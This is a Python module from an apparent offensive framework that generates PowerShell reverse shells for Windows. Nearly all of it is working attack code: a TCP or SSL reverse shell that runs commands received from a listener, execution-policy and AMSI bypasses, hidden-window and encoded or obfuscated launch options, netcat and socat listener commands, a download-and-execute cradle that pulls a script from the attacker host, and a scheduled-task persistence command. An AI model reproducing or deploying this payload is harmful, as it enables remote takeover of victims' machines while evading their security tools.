# /root/lazy1/modules/payloads/reverse/windows/powershell_tcp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Windows PowerShell Reverse TCP (Advanced)",
    "description": "Advanced PowerShell reverse shell with multiple evasion techniques",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Windows",
    "arch": "x86/x64",
    "rank": "Excellent",
    "references": [
        "https://docs.microsoft.com/en-us/powershell/",
        "https://attack.mitre.org/techniques/T1059/001/"
    ]
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port",
        "required": True,
        "default": "4444"
    },
    "method": {
        "description": "PowerShell execution method",
        "required": False,
        "default": "encoded",
        "choices": ["encoded", "one-liner", "bypass", "memory", "obfuscated"]
    },
    "bypass": {
        "description": "Execution policy bypass",
        "required": False,
        "default": "true",
        "choices": ["true", "false"]
    },
    "ssl": {
        "description": "Use SSL/TLS encryption",
        "required": False,
        "default": "false",
        "choices": ["true", "false"]
    },
    "proxy": {
        "description": "Use proxy for connection",
        "required": False,
        "default": ""
    }
}

def generate_powershell_reverse(lhost, lport, method="encoded", bypass=True, ssl=False, proxy=""):
    """Generate advanced PowerShell reverse shell"""
    
    # Base payload
    if ssl:
        base_payload = f'''
$s=New-Object System.Net.Sockets.TcpClient("{lhost}",{lport});
$sslStream=New-Object System.Net.Security.SslStream($s.GetStream(),$false,{{$true}});
$sslStream.AuthenticateAsClient("{lhost}");
$w=New-Object System.IO.StreamWriter($sslStream);$r=New-Object System.IO.StreamReader($sslStream);
while($true){{
    $w.Write("PS "+(pwd).Path+"> ");$w.Flush();
    $c=$r.ReadLine();if($c -eq "exit"){{break;}}
    try{{$o=iex $c 2>&1|Out-String;$w.WriteLine($o);$w.Flush()}}catch{{$w.WriteLine($_);$w.Flush()}}
}}
$s.Close()'''
    else:
        base_payload = f'''
$c=New-Object System.Net.Sockets.TcpClient("{lhost}",{lport});
$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb=(iex $d 2>&1|Out-String);
    $sb2=$sb+"PS "+(pwd).Path+"> ";
    $sbt=([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);$s.Flush()
}}
$c.Close()'''
    
    # Add proxy if specified
    if proxy:
        base_payload = f'[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;' + base_payload
    
    # Apply method-specific modifications
    if method == "encoded":
        # Encode for -EncodedCommand
        encoded_bytes = base_payload.encode('utf-16le')
        encoded_payload = base64.b64encode(encoded_bytes).decode()
        if bypass:
            return f"powershell -Exec Bypass -NoP -NonI -W Hidden -Enc {encoded_payload}"
        else:
            return f"powershell -Enc {encoded_payload}"
    
    elif method == "one-liner":
        # Compact one-liner
        one_liner = base_payload.replace('\n', ';').replace('  ', ' ')
        if bypass:
            return f"powershell -Exec Bypass -NoP -NonI -W Hidden -C \"{one_liner}\""
        else:
            return f"powershell -C \"{one_liner}\""
    
    elif method == "bypass":
        # Multiple bypass techniques
        bypass_payload = f'''
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;
{base_payload}'''
        encoded_bytes = bypass_payload.encode('utf-16le')
        encoded_payload = base64.b64encode(encoded_bytes).decode()
        return f"powershell -NoP -NonI -W Hidden -Enc {encoded_payload}"
    
    elif method == "memory":
        # Memory-only execution
        memory_payload = f'''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
{base_payload}'''
        encoded_bytes = memory_payload.encode('utf-16le')
        encoded_payload = base64.b64encode(encoded_bytes).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_payload}"
    
    elif method == "obfuscated":
        # String obfuscation
        obfuscated = base_payload.replace('System.Net.Sockets.TcpClient', '$([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]78+[char]101+[char]116+[char]46+[char]83+[char]111+[char]99+[char]107+[char]101+[char]116+[char]115+[char]46+[char]84+[char]99+[char]112+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116)')
        encoded_bytes = obfuscated.encode('utf-16le')
        encoded_payload = base64.b64encode(encoded_bytes).decode()
        return f"powershell -Exec Bypass -NoP -NonI -W Hidden -Enc {encoded_payload}"

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "4444")
    method = options.get("method", "encoded")
    bypass = options.get("bypass", "true").lower() == "true"
    ssl = options.get("ssl", "false").lower() == "true"
    proxy = options.get("proxy", "")
    
    console.print("\n[bold green]🔄 Windows PowerShell Reverse TCP (Advanced)[/bold green]")
    console.print("=" * 60)
    
    payload = generate_powershell_reverse(lhost, lport, method, bypass, ssl, proxy)
    
    # Display payload information
    info_table = Table(show_header=False, box=box.SIMPLE)
    info_table.add_column("Property", style="cyan")
    info_table.add_column("Value", style="white")
    
    info_table.add_row("Listener", f"{lhost}:{lport}")
    info_table.add_row("Platform", "Windows")
    info_table.add_row("Method", method)
    info_table.add_row("Bypass", str(bypass))
    info_table.add_row("SSL/TLS", str(ssl))
    info_table.add_row("Proxy", proxy if proxy else "None")
    
    console.print(info_table)
    
    # Display payload
    console.print(f"\n[bold yellow]📦 Generated Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="red", title="PAYLOAD"))
    
    # Usage instructions
    console.print(f"\n[bold green]🚀 Usage Instructions:[/bold green]")
    
    if method == "encoded":
        console.print("1. Copy the entire command")
        console.print("2. Execute in cmd.exe or PowerShell")
        console.print("3. No temporary files created")
    
    console.print(f"\n[bold blue]🎯 Listener Setup:[/bold blue]")
    if ssl:
        console.print(f"Use socat with SSL: socat OPENSSL-LISTEN:{lport},cert=server.pem,verify=0,reuseaddr STDOUT")
    else:
        console.print(f"nc -lnvp {lport}")
        console.print(f"ncat -lvp {lport}")
    
    # Alternative methods
    console.print(f"\n[bold magenta]🔧 Alternative Methods:[/bold magenta]")
    alternatives = [
        ("Download & Execute", f"iex (New-Object Net.WebClient).DownloadString('http://{lhost}:8000/payload.ps1')"),
        ("From File", "Save as .ps1 and run: powershell -File payload.ps1"),
        ("Scheduled Task", "schtasks /create /tn Update /tr 'powershell -Enc ...' /sc once /st 00:00"),
    ]
    
    for alt_name, alt_cmd in alternatives:
        console.print(f"  • {alt_name}: [dim]{alt_cmd}[/dim]")
    
    return payload
